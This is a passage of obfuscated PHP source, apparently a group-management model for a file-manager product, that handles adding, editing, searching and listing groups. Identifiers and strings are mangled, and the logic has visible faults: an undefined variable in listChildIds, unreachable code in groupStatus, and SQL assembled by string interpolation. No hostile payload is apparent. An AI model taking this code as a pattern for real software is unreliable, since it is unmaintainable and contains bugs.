___getInfo($Äèğ¬ŠÛ) { $¸€ü°Æ = $this->getInfoSimple($Äèğ¬ŠÛ); if (!$¸€ü°Æ) { return !1; } return $this->_listDataApplyItem($¸€ü°Æ); } protected function ___getInfoSimple($ÌÑ…“ÏÛ) { $ãÎ¬š•½ = array($_SERVER[¹Éµ„ºå][1484] => intval($ÌÑ…“ÏÛ)); $Äã×Ò¾ = $this->where($ãÎ¬š•½)->find(); return is_array($Äã×Ò¾) ? $Äã×Ò¾ : array(); } protected function groupAdd($Ğ¦º»ûé) { $„ıšëçÅ =& $_SERVER[¹Éµ„ºå]; if (!$Ğ¦º»ûé[$„ıšëçÅ[190]] && isset($Ğ¦º»ûé[$„ıšëçÅ[1484]]) && $Ğ¦º»ûé[$„ıšëçÅ[1484]] == 1) { if ($Üî¤Ç³û = $this->getInfoSimple($Ğ¦º»ûé[$„ıšëçÅ[1484]], !0)) { return $Ğ¦º»ûé[$„ıšëçÅ[1484]]; } } else { $Üî¤Ç³û = $this->getInfoSimple($Ğ¦º»ûé[$„ıšëçÅ[190]]); if (!$Üî¤Ç³û) { return !1; } } $Ï“Î¶œ = $„ıšëçÅ[613]; if ($Üî¤Ç³û[$„ıšëçÅ[604]]) { $Ï“Î¶œ = $Üî¤Ç³û[$„ıšëçÅ[604]] . $Üî¤Ç³û[$„ıšëçÅ[1484]] . $„ıšëçÅ[50]; } $Ş’¥ÆÌ£ = array($„ıšëçÅ[509] => $this->groupNameAuto($Ğ¦º»ûé[$„ıšëçÅ[190]], $Ğ¦º»ûé[$„ıšëçÅ[32]]), $„ıšëçÅ[492] => $Ğ¦º»ûé[$„ıšëçÅ[190]], $„ıšëçÅ[674] => $Ï“Î¶œ, $„ıšëçÅ[2256] => $Ğ¦º»ûé[$„ıšëçÅ[2156]], $„ıšëçÅ[2257] => 0, $„ıšëçÅ[2175] => 0); $Ğ¦º»ûé[$„ıšëçÅ[32]] = $Ş’¥ÆÌ£[$„ıšëçÅ[32]]; if (isset($Ğ¦º»ûé[$„ıšëçÅ[2193]])) { $Ş’¥ÆÌ£[$„ıšëçÅ[2193]] = $Ğ¦º»ûé[$„ıšëçÅ[2193]]; } else { $š…ü®à¶ = $this->max($„ıšëçÅ[2193]); if (!$š…ü®à¶) { $š…ü®à¶ = 0; } $Ş’¥ÆÌ£[$„ıšëçÅ[2193]] = $š…ü®à¶ + 1; } if (!empty($Ğ¦º»ûé[$„ıšëçÅ[1484]])) { $Ş’¥ÆÌ£[$„ıšëçÅ[1484]] = $Ğ¦º»ûé[$„ıšëçÅ[1484]]; } $´‘ööŞ­ = $this->add($Ş’¥ÆÌ£); $this->groupMetaEdit($´‘ööŞ­, $Ğ¦º»ûé); Model($„ıšëçÅ[1523])->groupRootAdd($´‘ööŞ­); $this->_clearCache($Ğ¦º»ûé[$„ıšëçÅ[190]]); return $´‘ööŞ­; } protected function groupEdit($®±áËç±, $¡ ¼õ©) { $ù›¯®ã± =& $_SERVER[¹Éµ„ºå]; $·ÎÃéÔ› = $this->getInfoSimple($®±áËç±); if (!$·ÎÃéÔ›) { return !1; } if (!empty($¡ ¼õ©[$ù›¯®ã±[190]])) { $¡Âñ‰ŠÆ = $this->getInfoSimple($¡ ¼õ©[$ù›¯®ã±[190]]); if (!$¡Âñ‰ŠÆ) { return !1; } if ($·ÎÃéÔ›[$ù›¯®ã±[1484]] == $¡Âñ‰ŠÆ[$ù›¯®ã±[1484]]) { return !1; } if ($¡ ¼õ©[$ù›¯®ã±[190]] != $·ÎÃéÔ›[$ù›¯®ã±[190]]) { if ($¡Âñ‰ŠÆ[$ù›¯®ã±[604]] !== $·ÎÃéÔ›[$ù›¯®ã±[604]] && strpos($¡Âñ‰ŠÆ[$ù›¯®ã±[604]], $·ÎÃéÔ›[$ù›¯®ã±[604]] . $·ÎÃéÔ›[$ù›¯®ã±[1484]] . $ù›¯®ã±[50]) === 0) { return !1; } $¡ ¼õ©[$ù›¯®ã±[674]] = $¡Âñ‰ŠÆ[$ù›¯®ã±[604]] . $¡ ¼õ©[$ù›¯®ã±[190]] . $ù›¯®ã±[50]; $this->_changeChildLevel($·ÎÃéÔ›, $¡Âñ‰ŠÆ); $this->_clearCache($¡Âñ‰ŠÆ[$ù›¯®ã±[1484]]); $this->_clearCache($·ÎÃéÔ›[$ù›¯®ã±[190]]); } } $this->groupMetaEdit($®±áËç±, $¡ ¼õ©); $this->_clearChildrenCache($·ÎÃéÔ›); return $this->where(array($ù›¯®ã±[2258] => $®±áËç±))->save($¡ ¼õ©); } private function groupMetaEdit($ù¯³¶ÍÇ, &$øŒüß) { $¹¤¼Ïşé =& $_SERVER[¹Éµ„ºå]; if (isset($øŒüß[$¹¤¼Ïşé[32]])) { $this->setNamePinyin($ù¯³¶ÍÇ, $øŒüß[$¹¤¼Ïşé[32]]); } if (isset($øŒüß[$¹¤¼Ïşé[2259]])) { $¯Üì·¢ö = array($¹¤¼Ïşé[2259] => $øŒüß[$¹¤¼Ïşé[2259]], $¹¤¼Ïşé[2260] => $øŒüß[$¹¤¼Ïşé[2260]]); unset($øŒüß[$¹¤¼Ïşé[2259]]); unset($øŒüß[$¹¤¼Ïşé[2260]]); if (isset($øŒüß[$¹¤¼Ïşé[2261]])) { $¨µ‡‡è = $¹¤¼Ïşé[1480] . $ù¯³¶ÍÇ; $è¼Ò‘ßÁ = $¹¤¼Ïşé[1479]; $÷¢Áå¢¹ = $øŒüß[$¹¤¼Ïşé[2261]] ? $øŒüß[$¹¤¼Ïşé[2261]] : $¹¤¼Ïşé[12]; $«îüæ•Ú = Model($¹¤¼Ïşé[1478])->get($¨µ‡‡è, $è¼Ò‘ßÁ); $«îüæ•Ú = $«îüæ•Ú ? $«îüæ•Ú : $¹¤¼Ïşé[12]; if ($«îüæ•Ú != $÷¢Áå¢¹) { if (!$÷¢Áå¢¹ && $«îüæ•Ú) { Model($¹¤¼Ïşé[1478])->remove($¨µ‡‡è, $è¼Ò‘ßÁ); } else { if ($÷¢Áå¢¹) { Model($¹¤¼Ïşé[1478])->set($¨µ‡‡è, $÷¢Áå¢¹, $è¼Ò‘ßÁ); } } } $¯Üì·¢ö[$¹¤¼Ïşé[2261]] = $÷¢Áå¢¹; } $this->metaSet($ù¯³¶ÍÇ, $¯Üì·¢ö); } } private function _clearChildrenCache($®Ë¬ïë·) { $àœúÂÊ‹ =& $_SERVER[¹Éµ„ºå]; $¤»Õ«•Š = array($àœúÂÊ‹[674] => array($àœúÂÊ‹[635], $®Ë¬ïë·[$àœúÂÊ‹[604]] . $®Ë¬ïë·[$àœúÂÊ‹[1484]] . $àœúÂÊ‹[636])); $µ¦Ûí¿® = $this->field($àœúÂÊ‹[1484])->where($¤»Õ«•Š)->select(); foreach ($µ¦Ûí¿® as $ªÓ°Ö®Ú) { $this->_clearCache($ªÓ°Ö®Ú[$àœúÂÊ‹[1484]]); } } private function _clearCache($åÕÁ•º) { $¨âŞí­µ =& $_SERVER[¹Éµ„ºå]; $this->cacheFunctionClear($¨âŞí­µ[2262], $åÕÁ•º); $this->cacheFunctionClear($¨âŞí­µ[2263], $åÕÁ•º); } private function _changeChildLevel($ìîîÚèÕ, $–ÕÂÊŒ, $Íï¯ö— = false) { $‘…¬ØöÒ =& $_SERVER[¹Éµ„ºå]; $óéÎÚİê = $ìîîÚèÕ[$‘…¬ØöÒ[604]] . $ìîîÚèÕ[$‘…¬ØöÒ[1484]] . $‘…¬ØöÒ[50]; $´›êİ³Ò = $–ÕÂÊŒ[$‘…¬ØöÒ[604]] . $–ÕÂÊŒ[$‘…¬ØöÒ[1484]] . $‘…¬ØöÒ[50] . $ìîîÚèÕ[$‘…¬ØöÒ[1484]] . $‘…¬ØöÒ[50]; if ($Íï¯ö—) { $´›êİ³Ò = $–ÕÂÊŒ[$‘…¬ØöÒ[604]] . $–ÕÂÊŒ[$‘…¬ØöÒ[1484]] . $‘…¬ØöÒ[50]; } $şŠÏÂ”« = array($‘…¬ØöÒ[674] => array($‘…¬ØöÒ[635], $ìîîÚèÕ[$‘…¬ØöÒ[604]] . $ìîîÚèÕ[$‘…¬ØöÒ[1484]] . $‘…¬ØöÒ[636])); $Û»•ÀÍè = array($‘…¬ØöÒ[674] => array($‘…¬ØöÒ[683], "\162\x65\x70\x6c\141\143\145\x28\x70\x61\x72\x65\156\164\114\x65\166\x65\x6c\x2c\x27{$óéÎÚİê}\47\x2c\47{$´›êİ³Ò}\x27\x29")); $this->_clearChildrenCache($ìîîÚèÕ); $this->where($şŠÏÂ”«)->data($Û»•ÀÍè)->save(); } public function setNamePinyin($·Çú¹à, $¬¡›É— = false) { $¹€•¨ÊÙ =& $_SERVER[¹Éµ„ºå]; if (!$¬¡›É—) { $ÌÍ®§¡… = $this->getInfoSimple($·Çú¹à); $¬¡›É— = $ÌÍ®§¡…[$¹€•¨ÊÙ[32]]; } if (!Input::check($¬¡›É—, $¹€•¨ÊÙ[677])) { $this->metaSet($·Çú¹à, $¹€•¨ÊÙ[552], null); $this->metaSet($·Çú¹à, $¹€•¨ÊÙ[551], null); return; } $È„—ÚÔ = array($¹€•¨ÊÙ[552] => str_replace($¹€•¨ÊÙ[53], $¹€•¨ÊÙ[12], Pinyin::get($¬¡›É—)), $¹€•¨ÊÙ[551] => Pinyin::get($¬¡›É—, $¹€•¨ÊÙ[678])); $this->metaSet($·Çú¹à, $È„—ÚÔ); } protected function metaSet($¢ä«òÚ, $Ï­Ú×õâ = null, $éˆ±ñ†İ = null) { $this->_clearCache($¢ä«òÚ); return parent::metaSet($¢ä«òÚ, $Ï­Ú×õâ, $éˆ±ñ†İ); } protected function groupStatus($ÈÌŠ±äÉ, $à³€Ü²Ò) { $±øì¹Ó =& $_SERVER[¹Éµ„ºå]; $ÍÈˆ¤ƒ = $this->getInfoSimple($ÈÌŠ±äÉ); if (!$ÍÈˆ¤ƒ) { return !1; } $this->_clearCache($ÈÌŠ±äÉ); return $this->metaSet($ÈÌŠ±äÉ, $±øì¹Ó[841], $à³€Ü²Ò); if ($à³€Ü²Ò == $±øì¹Ó[91]) { $€òøÂç = $this->parentLevelArray($ÍÈˆ¤ƒ[$±øì¹Ó[604]]); } else { } $€òøÂç[] = $ÍÈˆ¤ƒ[$±øì¹Ó[1484]]; $¥íÏß‹  = array(); foreach ($€òøÂç as $ÈÌŠ±äÉ) { $¥íÏß‹ [] = array($±øì¹Ó[1484] => $ÈÌŠ±äÉ, $±øì¹Ó[95] => $±øì¹Ó[841], $±øì¹Ó[451] => $à³€Ü²Ò); $this->_clearCache($ÈÌŠ±äÉ); } return Model($±øì¹Ó[2264])->addAll($¥íÏß‹ , array(), !0); } protected function groupRemove($é»‰¦ÛÙ, $•äÆÔ‹ú = false) { $Ó“æ§Ÿä =& $_SERVER[¹Éµ„ºå]; $å‡²Ôìè = array($Ó“æ§Ÿä[1484] => $é»‰¦ÛÙ); $“‹¹ªà– = $this->where($å‡²Ôìè)->find(); if (!$“‹¹ªà– || $“‹¹ªà–[$Ó“æ§Ÿä[190]] == 0) { return !1; } if (!$•äÆÔ‹ú) { $ÑŸéø»‚ = $this->getInfoSimple($“‹¹ªà–[$Ó“æ§Ÿä[190]]); $this->_changeChildLevel($“‹¹ªà–, $ÑŸéø»‚, !0); $this->where(array($Ó“æ§Ÿä[190] => $é»‰¦ÛÙ))->save(array($Ó“æ§Ÿä[190] => $“‹¹ªà–[$Ó“æ§Ÿä[190]])); $this->_clearCache($ÑŸéø»‚[$Ó“æ§Ÿä[1484]]); } Model($Ó“æ§Ÿä[2264])->where($å‡²Ôìè)->delete(); Model($Ó“æ§Ÿä[2265])->where($å‡²Ôìè)->delete(); Model($Ó“æ§Ÿä[924])->groupRootRemove($é»‰¦ÛÙ); $this->_clearCache($“‹¹ªà–[$Ó“æ§Ÿä[190]]); return $this->where($å‡²Ôìè)->delete(); } protected function groupSort($¶—²†¨) { $ë«±ìß’ =& $_SERVER[¹Éµ„ºå]; $®Ç®á·š = array(); foreach ($¶—²†¨ as $™¤ŠîÉ¬ => $‡­ıÕº) { $®Ç®á·š[] = array($ë«±ìß’[1484], $‡­ıÕº, $ë«±ìß’[2193], $™¤ŠîÉ¬ + 1); } $this->saveAll($®Ç®á·š); } public function listData() { $„ğ Àà© = $this->_makeOrder()->selectPage(50); $this->_listDataApply($„ğ Àà©[$_SERVER[¹Éµ„ºå][446]]); return $„ğ Àà©; } private function _makeOrder($İ„ŸÙ = '') { $´¡ˆÆ¶ =& $_SERVER[¹Éµ„ºå]; $ìÏ¥àù = array($´¡ˆÆ¶[1484], $´¡ˆÆ¶[32], $´¡ˆÆ¶[2158], $´¡ˆÆ¶[231]); $âçÎş¼ = array($´¡ˆÆ¶[537] => $´¡ˆÆ¶[538], $´¡ˆÆ¶[539] => $´¡ˆÆ¶[540]); $Â½è» = Input::get($´¡ˆÆ¶[544], $´¡ˆÆ¶[7], $´¡ˆÆ¶[2175], $ìÏ¥àù); $¥õ×ı÷• = Input::get($´¡ˆÆ¶[545], $´¡ˆÆ¶[7], $´¡ˆÆ¶[2266], array($´¡ˆÆ¶[2266], $´¡ˆÆ¶[539])); $¥õ×ı÷• = $âçÎş¼[$¥õ×ı÷•]; $İ„ŸÙ = $İ„ŸÙ . "{$Â½è»}\40{$¥õ×ı÷•}\54\x20\147\x72\157\165\160\111\x44\40\x61\x73\x63"; return $this->order($İ„ŸÙ); } public function listChild($‰œ‡œŒ) { $¨¿·”¶Ş =& $_SERVER[¹Éµ„ºå]; $ÖÛ—ğÍ‰ = $this->where(array($¨¿·”¶Ş[190] => $‰œ‡œŒ))->_makeOrder()->selectPage(200); $this->_listDataApply($ÖÛ—ğÍ‰[$¨¿·”¶Ş[446]]); return $ÖÛ—ğÍ‰; } public function listChildIds($Õ‡Š¥) { $À‰ò–¸ =& $_SERVER[¹Éµ„ºå]; if (is_string($õ‡÷ş¹)) { $Õ‡Š¥ = explode($À‰ò–¸[50], $Õ‡Š¥); } $°†¨¦× = $this->where(array($À‰ò–¸[1484] => array($À‰ò–¸[7], $Õ‡Š¥)))->field($À‰ò–¸[2267])->select(); if (!$°†¨¦×) { return !1; } $İÕ­á‚í = array(); foreach ($°†¨¦× as $ñ§æÒşÊ) { $İÕ­á‚í[] = "\163\x65\x6c\x65\x63\164\x20\147\x72\x6f\x75\x70\x49\104\x20\146\162\x6f\x6d\40\140\x67\x72\x6f\x75\x70\x60\x20\x77\150\x65\162\x65\x20\160\141\x72\x65\x6e\164\114\145\166\x65\154\x20\x6c\151\x6b\145\40\47{$ñ§æÒşÊ[$À‰ò–¸[604]]}{$ñ§æÒşÊ[$À‰ò–¸[1484]]}\x2c\45\47"; } $İÕ­á‚í = implode($À‰ò–¸[2268], $İÕ­á‚í); $°†¨¦× = $this->query($İÕ­á‚í); if (!$°†¨¦×) { return array(); } $Õ‡Š¥ = array_to_keyvalue($°†¨¦×, $À‰ò–¸[12], $À‰ò–¸[1484]); return array_unique($Õ‡Š¥); } public function listByID($©È§Àá) { $›¤¦Ù´î =& $_SERVER[¹Éµ„ºå]; if (!$©È§Àá) { return array(); } $–Áç­Óƒ = array($›¤¦Ù´î[1484] => array($›¤¦Ù´î[7], $©È§Àá)); $İøØ¼øØ = $this->where($–Áç­Óƒ)->select(); $İøØ¼øØ = array_sort_keep($İøØ¼øØ, $›¤¦Ù´î[1484], $©È§Àá); $this->_listDataApply($İøØ¼øØ); return $İøØ¼øØ; } public function listSearch($’±Üõ—ò) { $õ¿öîª° =& $_SERVER[¹Éµ„ºå]; $òÚ„ãÛ¹ = trim($’±Üõ—ò[$õ¿öîª°[2269]]); $öŒ÷ÑœÊ = explode($õ¿öîª°[53], $òÚ„ãÛ¹); if (!$òÚ„ãÛ¹ || count($öŒ÷ÑœÊ) == 1) { return $this->listSearchNow($’±Üõ—ò); } $²Ã“ğƒÕ = array($õ¿öîª°[446] => array()); foreach ($öŒ÷ÑœÊ as $æ¼Èíü‹) { if (!trim($æ¼Èíü‹)) { continue; } $’±Üõ—ò[$õ¿öîª°[2269]] = $æ¼Èíü‹; $ûÛéıªÛ = $this->listSearchNow($’±Üõ—ò); $²Ã“ğƒÕ[$õ¿öîª°[446]] = array_merge($²Ã“ğƒÕ[$õ¿öîª°[446]], $ûÛéıªÛ[$õ¿öîª°[446]]); } $²Ã“ğƒÕ[$õ¿öîª°[446]] = array_unique_by_key($²Ã“ğƒÕ[$õ¿öîª°[446]], $õ¿öîª°[1484]); $²Ã“ğƒÕ[$õ¿öîª°[443]] = array($õ¿öîª°[444] => count($²Ã“ğƒÕ[$õ¿öîª°[446]]), $õ¿öîª°[439] => 20, $õ¿öîª°[428] => 1, $õ¿öîª°[445] => 1); return $²Ã“ğƒÕ; } public function listSearchNow($§÷Ìâ€) { $¼ÃØÄÈ =& $_SERVER[¹Éµ„ºå]; $›·„¦ş = trim($§÷Ìâ€[$¼ÃØÄÈ[2269]]); $ÛéÃ±óå = isset($§÷Ìâ€[$¼ÃØÄÈ[2270]]) ? $§÷Ìâ€[$¼ÃØÄÈ[2270]] : !1; if (!trim($›·„¦ş)) { return !1; } $›·„¦ş = str_replace($¼ÃØÄÈ[2271], $¼ÃØÄÈ[2272], $›·„¦ş); $°öÁ‡õ = array($¼ÃØÄÈ[1484] => array($¼ÃØÄÈ[473], "{$›·„¦ş}\x25"), $¼ÃØÄÈ[32] => array($¼ÃØÄÈ[473], "\45{$›·„¦ş}\x25"), $¼ÃØÄÈ[1157] => $¼ÃØÄÈ[2273]); if ($ÛéÃ±óå) { $œôçéØÖ = $this->getInfoSimple($ÛéÃ±óå); $€Ã¾›Ş˜ = $œôçéØÖ[$¼ÃØÄÈ[604]] . $ÛéÃ±óå . $¼ÃØÄÈ[636]; $°öÁ‡õ = array($°öÁ‡õ, array($¼ÃØÄÈ[604] => array($¼ÃØÄÈ[473], $€Ã¾›Ş˜))); } $°öÁ‡õ = $this->parseWhereLike($°öÁ‡õ); $å‘©³œö = $this->_makeOrder()->where($°öÁ‡õ)->selectPage(20); $å‘©³œö = $å‘©³œö ? $å‘©³œö : array($¼ÃØÄÈ[446] => array(), $¼ÃØÄÈ[443] => array()); if (!$å‘©³œö || count($å‘©³œö[$¼ÃØÄÈ[446]]) < 5 && Input::check($›·„¦ş, $¼ÃØÄÈ[393])) { $Ü¹¢Ù¨× = $this->groupChildrenAll($ÛéÃ±óå); $°çÅšµö = $this->_searchFromMeta($¼ÃØÄÈ[551], $›·„¦ş, 10, $Ü¹¢Ù¨×); $ÚÙà¶ñ™ = $this->_searchFromMeta($¼ÃØÄÈ[552], $›·„¦ş, 10, $Ü¹¢Ù¨×); $ˆ¯ÆÔ”õ = array_merge($°çÅšµö, $ÚÙà¶ñ™, $å‘©³œö[$¼ÃØÄÈ[446]]); $å‘©³œö[$¼ÃØÄÈ[446]] = array_unique_by_key($ˆ¯ÆÔ”õ, $¼ÃØÄÈ[1484]); $å‘©³œö[$¼ÃØÄÈ[443]][$¼ÃØÄÈ[444]] = count($å‘©³œö[$¼ÃØÄÈ[446]]); $å‘©³œö[$¼ÃØÄÈ[443]][$¼ÃØÄÈ[445]] = ceil($å‘©³œö[$¼ÃØÄÈ[443]][$¼ÃØÄÈ[444]] / $å‘©³œö[$¼ÃØÄÈ[443]][$¼ÃØÄÈ[439]]); } $this->_listDataApply($å‘©³œö[$¼ÃØÄÈ[446]]); return $å‘©³œö; } protected function groupChildrenAll($”éÖÜŞã) { $ÏâİÍó =& $_SERVER[¹Éµ„ºå]; if (!$”éÖÜŞã) { return !1; } if (!is_array($”éÖÜŞã)) { $”éÖÜŞã = array($”éÖÜŞã); } $”ï §Ù = $”éÖÜŞã; foreach ($”éÖÜŞã as $–„½ªù ) { $æÀ‘ÂôÆ = $this->getInfoSimple($–„½ªù ); $ƒ¼‰ËË“ = array($ÏâİÍó[604] => array($ÏâİÍó[473], $æÀ‘ÂôÆ[$ÏâİÍó[604]] . $–„½ªù  . $ÏâİÍó[636])); $‡ßç¼Â = $this->field($ÏâİÍó[1484])->where($ƒ¼‰ËË“)->select(); $”ï §Ù = array_merge($”ï §Ù, array_to_keyvalue($‡ßç¼Â, $ÏâİÍó[12], $ÏâİÍó[1484])); } return array_unique($”ï §Ù); } private function _searchFromMeta($¶£ÇÒïĞ, $½‡Ö¾, $Â“­çÌ·, $»Ó÷ü·â) { $ß» ÚÖõ =& $_SERVER[¹Éµ„ºå]; $½‡Ö¾ = strtolower($½‡Ö¾); $¸©ÆšÍ‚ = array($ß» ÚÖõ[95] => $¶£ÇÒïĞ, $ß» ÚÖõ[451] => array($ß» ÚÖõ[473], "\x25{$½‡Ö¾}\45")); $¸©ÆšÍ‚ = $this->parseWhereLike($¸©ÆšÍ‚); if ($»Ó÷ü·â) { $¸©ÆšÍ‚[$ß» ÚÖõ[1484]] = array($ß» ÚÖõ[7], $»Ó÷ü·â); } $ãØóÃ˜ = Model($ß» ÚÖõ[2274])->where($¸©ÆšÍ‚)->limit($Â“­çÌ·)->select(); if (!$ãØóÃ˜) { return array(); } $ãØóÃ˜ = array_to_keyvalue($ãØóÃ˜, $ß» ÚÖõ[12], $ß» ÚÖõ[1484]); $«ıìä¾æ = $this->where(array($ß» ÚÖõ[2258] => array($ß» ÚÖõ[7], $ãØóÃ˜)))->select(); if (!$«ıìä¾æ) { return array(); } return $«ıìä¾æ; } protected function _listDataApplyItem($á©¥ø€Ÿ) { $ß£Á¹â… = array($á©¥ø€Ÿ); $this->_listDataApply($ß£Á¹â…); return $ß£Á¹â…[0]; } protected function _listDataApply(&$í·´ÀĞ·) { $Íğ‰Ó =& $_SERVER[¹Éµ„ºå]; if (!$í·´ÀĞ·) { return; } $´éÉŸƒš = array_to_keyvalue($í·´ÀĞ·, $Íğ‰Ó[12], $Íğ‰Ó[1484]); $this->_listAppendChildren($í·´ÀĞ·); $this->_listAppendChildrenMember($í·´ÀĞ·); $this->_listAppendMeta($í·´ÀĞ·, $´éÉŸƒš); $this->_listAppendParent($í·´ÀĞ·); $this->_listAppendSourceRoot($í·´ÀĞ·, $´éÉŸƒš); } private function _listAppendChildren(&$¦®öÊÌ¥) { $ÔøùŸ›û =& $_SERVER[¹Éµ„ºå]; $ª¾ª˜è = array_to_keyvalue($¦®öÊÌ¥, $ÔøùŸ›û[12], $ÔøùŸ›û[1484]); $Ãé™µÃœ = array($ÔøùŸ›û[190] => array($ÔøùŸ›û[7], $ª¾ª˜è)); $™ñ´Ñ°É = array($ÔøùŸ›û[190], $ÔøùŸ›û[2275] => $ÔøùŸ›û[585]); $®ÁÈõ‹ú = $this->field($™ñ´Ñ°É)->where($Ãé™µÃœ)->group($ÔøùŸ›û[190])->select(); $éû§“¨ñ = array_to_keyvalue($®ÁÈõ‹ú, $ÔøùŸ›û[190], $ÔøùŸ›û[585]); foreach ($¦®öÊÌ¥ as &$øõå­Î¶) { $ë‚¨«ì‘ = $øõå­Î¶[$ÔøùŸ›û[1484]]; $øõå­Î¶[$ÔøùŸ›û[2276]] = isset($éû§“¨ñ[$ë‚¨«ì‘]) ? intval($éû§“¨ñ[$ë‚¨«ì‘]) : !1; } unset($øõå­Î¶); } private function _listAppendChildrenMember(&$åøË¿õĞ) { $»¤ÇäØÄ =& $_SERVER[¹Éµ„ºå]; $Ó‹ÅÜš¿ = array_to_keyvalue($åøË¿õĞ, $»¤ÇäØÄ[12], $»¤ÇäØÄ[1484]); $ûì‘Ô = array($»¤ÇäØÄ[1484] => array($»¤ÇäØÄ[7], $Ó‹ÅÜš¿)); $†ö÷¤£é = array($»¤ÇäØÄ[1484], $»¤ÇäØÄ[2275] => $»¤ÇäØÄ[585]); $…†›…ãÃ = Model($»¤ÇäØÄ[2265])->field($†ö÷¤£é)->where($ûì‘Ô)->group($»¤ÇäØÄ[1484])->select(); $Ó‹¬ò·Ø = array_to_keyvalue($…†›…ãÃ, $»¤ÇäØÄ[1484], $»¤ÇäØÄ[585]); foreach ($åøË¿õĞ as &$ÈÌ¦»ÌÎ) { $²¾íÓß¶ = $ÈÌ¦»ÌÎ[$»¤ÇäØÄ[1484]]; $ÈÌ¦»ÌÎ[$»¤ÇäØÄ[2277]] = isset($Ó‹¬ò·Ø[$²¾íÓß¶]) ? intval($Ó‹¬ò·Ø[$²¾íÓß¶]) : !1; } unset($ÈÌ¦»ÌÎ); } private function _listAppendMeta(&$³™–âú­, $ÇªÅ§‡ó) { $Üšëï§Ú =& $_SERVER[¹Éµ„ºå]; $Êİ¦µÄ± = array($Üšëï§Ú[1484] => array($Üšëï§Ú[7], $ÇªÅ§‡ó)); $Û¼ºÓôˆ = Model($Üšëï§Ú[2264])->where($Êİ¦µÄ±)->select(); $Û¼ºÓôˆ = array_to_keyvalue_group($Û¼ºÓôˆ, $Üšëï§Ú[1484]); foreach ($Û¼ºÓôˆ as &$¢ä€ÕÑ) { $¢ä€ÕÑ = array_to_keyvalue($¢ä€ÕÑ, $Üšëï§Ú[95], $Üšëï§Ú[451]); } unset($¢ä€ÕÑ); foreach ($³™–âú­ as &$¶¨à„Õ) { $¶¨à„Õ[$Üšëï§Ú[555]] = array(); if (isset($Û¼ºÓôˆ[$¶¨à„Õ[$Üšëï§Ú[1484]]])) { $¶¨à„Õ[$Üšëï§Ú[555]] = $Û¼ºÓôˆ[$¶¨à„Õ[$Üšëï§Ú[1484]]]; } } unset($¶¨à„Õ); } protected function parentLevelArray($¢É—·–‘) { $²Êà¨£Ó =& $_SERVER[¹Éµ„ºå]; $¢É—·–‘ = explode($²Êà¨£Ó[50], trim($¢É—·–‘, $²Êà¨£Ó[50])); $¢É—·–‘ = array_remove_value($¢É—·–‘, $²Êà¨£Ó[228]); return $¢É—·–‘; } protected function parentInGroup($ì¸ÕÀ·, $ÉÉÚ§¤É) { $ºõüØ»Ë =& $_SERVER[¹Éµ„ºå]; $ğÆ’ı‚’ = $this->getInfoSimple($ì¸ÕÀ·); if (!$ğÆ’ı‚’) { return !0; } $ÓĞà£Ë = $this->parentLevelArray($ğÆ’ı‚’[$ºõüØ»Ë[604]]); $ÓĞà£Ë[] = $ì¸ÕÀ·; foreach ($ÓĞà£Ë as $ì¸ÕÀ·) { if (in_array($ì¸ÕÀ· . $ºõüØ»Ë[12], $ÉÉÚ§¤É)) { return !0; } } return !1; } private function _listAppendParent(&$³œ•Ú¬Ñ) { $¿ºõ‚ÙÀ =& $_SERVER[¹Éµ„ºå]; $°æÇÂÍ› = array(); foreach ($³œ•Ú¬Ñ as &$¹€î¦ØÅ) { $°æÇÂÍ›[$¹€î¦ØÅ[$¿ºõ‚ÙÀ[1484]]] = $¹€î¦ØÅ[$¿ºõ‚ÙÀ[32]]; $÷Ÿæ¹¯‡ = $this->parentLevelArray($¹€î¦ØÅ[$¿ºõ‚ÙÀ[604]]); foreach ($÷Ÿæ¹¯‡ as $œÑò‡û²) { if (!isset($°æÇÂÍ›[$œÑò‡û²])) { $°æÇÂÍ›[$œÑò‡û²] = 0; } } } unset($¹€î¦ØÅ); foreach ($°æÇÂÍ› as $„ã½‰”‚ => $û­ïÂù†) { if ($û­ïÂù†) { continue; } $÷³êÆ£ = $this->getInfoSimple($„ã½‰”‚); $°æÇÂÍ›[$„ã½‰”‚] = $÷³êÆ£[$¿ºõ‚ÙÀ[32]]; } $ôµ¹èö‡ = $GLOBALS[$¿ºõ‚ÙÀ[6]][$¿ºõ‚ÙÀ[92]][$¿ºõ‚ÙÀ[2278]]; if (KodUser::isRoot()) { $ôµ¹èö‡ = !1; } foreach ($³œ•Ú¬Ñ as &$¹€î¦ØÅ) { $÷Ÿæ¹¯‡ = $this->parentLevelArray($¹€î¦ØÅ[$¿ºõ‚ÙÀ[604]]); $’³ØÉ®ë = $¿ºõ‚ÙÀ[12]; foreach ($÷Ÿæ¹¯‡ as $„ã½‰”‚ => $œÑò‡û²) { if ($ôµ¹èö‡ && $„ã½‰”‚ == 0) { continue; } $’³ØÉ®ë .= $°æÇÂÍ›[$œÑò‡û²] . $¿ºõ‚ÙÀ[8]; } if ($÷Ÿæ¹¯‡) { $’³ØÉ®ë .= $¹€î¦ØÅ[$¿ºõ‚ÙÀ[32]]; } $¹€î¦ØÅ[$¿ºõ‚ÙÀ[609]] = str_replace($¿ºõ‚ÙÀ[254], $¿ºõ‚ÙÀ[8], $’³ØÉ®ë); } unset($¹€î¦ØÅ); } private function _listAppendSourceRoot(&$ù²ü¤­ô, $Îğ€±Ç) { $¨”á½í =& $_SERVER[¹Éµ„ºå]; $¨²èÀ— = Model($¨”á½í[924])->listSourceRoot(SourceModel::TYPE_GROUP, $Îğ€±Ç); $¨²èÀ— = array_to_keyvalue($¨²èÀ—, $¨”á½í[589]); $¨²èÀ— = array_remove_key($¨²èÀ—, $¨”á½í[589]); foreach ($ù²ü¤­ô as &$û§²‹Ä²) { $û§²‹Ä²[$¨”á½í[90]] = $¨²èÀ—[$û§²‹Ä²[$¨”á½í[1484]]] ? $¨²èÀ—[$û§²‹Ä²[$¨”á½í[1484]]] : array(); } unset($û§²‹Ä²); } protected function groupMerge($„ş¤¿İ—) { $„ş¤¿İ— = array_values(array_unique($„ş¤¿İ—)); $êçÉ‚Â = array(); for ($ÅŒÀ—”ä = 0; $ÅŒÀ—”ä < count($„ş¤¿İ—); $ÅŒÀ—”ä++) { $”‡ÉŞ¶¨ = !1; for ($„Â´ŸÜ½ = 0; $„Â´ŸÜ½ < count($„ş¤¿İ—); $„Â´ŸÜ½++) { if ($ÅŒÀ—”ä == $„Â´ŸÜ½) { continue; } if ($this->isParentOf($„ş¤¿İ—[$„Â´ŸÜ½], $„ş¤¿İ—[$ÅŒÀ—”ä])) { $”‡ÉŞ¶¨ = !0; break; } } if (!$”‡ÉŞ¶¨) { $êçÉ‚Â[] = $„ş¤¿İ—[$ÅŒÀ—”ä]; } } return $êçÉ‚Â; 